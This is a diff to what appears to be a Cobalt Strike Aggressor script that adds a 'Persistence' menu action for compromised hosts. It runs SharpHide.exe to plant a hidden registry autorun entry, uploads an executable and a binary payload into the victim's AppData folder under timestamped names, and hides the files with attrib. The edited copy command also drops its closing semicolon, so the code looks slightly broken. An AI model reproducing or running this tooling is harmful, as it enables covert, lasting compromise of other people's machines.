@@ -2,7 +2,8 @@ popup beacon_bottom {
     # timeFile
 	item "Persistence"{
 		foreach $bid ($1) { } 
-		$userName = replace(beacon_info($bid, "user"), " ", "_"); 
+		$userName2 = replace(beacon_info($bid, "user"), "\\*", ""); 
+		$userName = replace($userName2, " ", ""); 
 		println($userName);
 		$istime = formatDate("HHmm");
 		bexecute_assembly($1,script_resource("SharpHide.exe"), "action=create keyvalue=\"C:\\Users\\".$userName."\\AppData\\".$istime.".exe\"");
@@ -10,8 +11,7 @@ popup beacon_bottom {
 		bupload($1, script_resource("calc.exe"));
 		bupload($1, script_resource("result.bin"));
 		bcp($1,"C:\\Users\\".$userName."\\AppData\\calc.exe","C:\\Users\\".$userName."\\AppData\\".$istime.".exe");
-		bcp($1,"C:\\Users\\".$userName."\\AppData\\result.bin","C:\\Users\\".$userName."\\AppData\\".$istime.".bin");
-
+		bcp($1,"C:\\Users\\".$userName."\\AppData\\result.bin","C:\\Users\\".$userName."\\AppData\\".$istime.".bin")	
 		bshell($1, "attrib.exe +h C:\\Users\\".$userName."\\AppData\\result.bin");
 		bshell($1, "attrib.exe +h C:\\Users\\".$userName."\\AppData\\calc.exe");
 		bshell($1, "attrib.exe +h C:\\Users\\".$userName."\\AppData\\".$istime.".bin");
